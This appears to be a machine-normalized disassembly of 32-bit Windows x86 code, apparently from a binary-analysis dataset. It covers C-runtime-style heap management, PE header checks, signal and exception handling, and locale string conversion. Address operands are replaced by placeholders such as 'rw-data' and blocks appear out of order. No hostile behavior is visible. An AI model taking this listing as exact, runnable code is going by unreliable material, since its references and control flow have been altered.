jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_4088fc
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_408517
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_408467
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_408bdf
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_404d8e
add edi 0x4
cmp edi 0x28
pop ecx
mov [ esi ] eax
jb r-xdata
pop edi
pop esi
retn
sub_408c00
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_408c30
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_408c80
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_4057d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_408c00
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_408c30
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408d54
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ esp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ esp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_408d95
push 0x20
push r--data
call sub_405770
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_404faa
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_4057b5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_408d54
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_4056f5
mov [ ebp - 0x1c ] 0x1
push eax
call sub_404e05
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_406b99
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_406efa
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_407d76
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_404dfc
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408f09
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_408f73
push 0x14
push r--data
call sub_405770
xor edi edi
mov [ ebp - 0x1c ] edi
push [ rw-data ]
call sub_404e05
pop ecx
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x20 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_4054fd
pop ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_4057b5
retn
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_406dfe
add esp 0x14
mov esi sub_408f63
push r--data
call [ GetModuleHandleA@IAT ]
cmp eax edi
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call sub_404d8e
pop ecx
mov [ rw-data ] eax
sub_409048
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_4090d8
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_409fc5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_409fe4
jmp r-xdata
sub_4090d8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_409038
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_409048
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40913a
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40916a
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40919b
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_408d88
test eax eax
je r-xdata
push 0xa
call sub_406f69
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_408d95
pop ecx
push 0x3
call sub_4056f5
int3
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_4031e0
lea eax [ ebp - 0x80 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x80 ] 0x40000015
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_40928e
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_409890
cmp eax 0xffffffff
pop ecx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409038
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
cmp esi ebx
mov edi eax
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_4098d7
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_405a68
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_4031e0
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40675e
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_405c3e
cmp eax ebx
pop ecx
je r-xdata
call sub_409a90
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_409446
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_403014
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40928e
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_409486
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_405a68
push [ esi + 0x8 ]
call sub_405a68
push [ esi + 0xc ]
call sub_405a68
push [ esi + 0x10 ]
call sub_405a68
push [ esi + 0x14 ]
call sub_405a68
push [ esi + 0x18 ]
call sub_405a68
push [ esi ]
call sub_405a68
push [ esi + 0x20 ]
call sub_405a68
push [ esi + 0x24 ]
call sub_405a68
push [ esi + 0x28 ]
call sub_405a68
push [ esi + 0x2c ]
call sub_405a68
push [ esi + 0x30 ]
call sub_405a68
push [ esi + 0x34 ]
call sub_405a68
push [ esi + 0x1c ]
call sub_405a68
push [ esi + 0x38 ]
call sub_405a68
push [ esi + 0x3c ]
call sub_405a68
add esp 0x40
push [ esi + 0x40 ]
call sub_405a68
push [ esi + 0x44 ]
call sub_405a68
push [ esi + 0x48 ]
call sub_405a68
push [ esi + 0x4c ]
call sub_405a68
push [ esi + 0x50 ]
call sub_405a68
push [ esi + 0x54 ]
call sub_405a68
push [ esi + 0x58 ]
call sub_405a68
push [ esi + 0x5c ]
call sub_405a68
push [ esi + 0x60 ]
call sub_405a68
push [ esi + 0x64 ]
call sub_405a68
push [ esi + 0x68 ]
call sub_405a68
push [ esi + 0x6c ]
call sub_405a68
push [ esi + 0x70 ]
call sub_405a68
push [ esi + 0x74 ]
call sub_405a68
push [ esi + 0x78 ]
call sub_405a68
push [ esi + 0x7c ]
call sub_405a68
add esp 0x40
push [ esi + 0x80 ]
call sub_405a68
push [ esi + 0x84 ]
call sub_405a68
push [ esi + 0x88 ]
call sub_405a68
push [ esi + 0x8c ]
call sub_405a68
push [ esi + 0x90 ]
call sub_405a68
push [ esi + 0x94 ]
call sub_405a68
push [ esi + 0x98 ]
call sub_405a68
push [ esi + 0x9c ]
call sub_405a68
push [ esi + 0xa0 ]
call sub_405a68
push [ esi + 0xa4 ]
call sub_405a68
push [ esi + 0xa8 ]
call sub_405a68
add esp 0x2c
sub_409616
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
push esi
call sub_405a68
pop ecx
sub_409656
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_405a68
pop ecx
push esi
call sub_405a68
pop ecx
sub_4096df
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
call sub_406b99
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_406b99
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
sub_409750
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_409796
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push edi
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_406b99
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_406b99
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
sub_409850
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_409890
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40a0c4
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409038
leave
retn
sub_4098d7
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
test eax eax
mov ebx [ MultiByteToWideChar@IAT ]
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
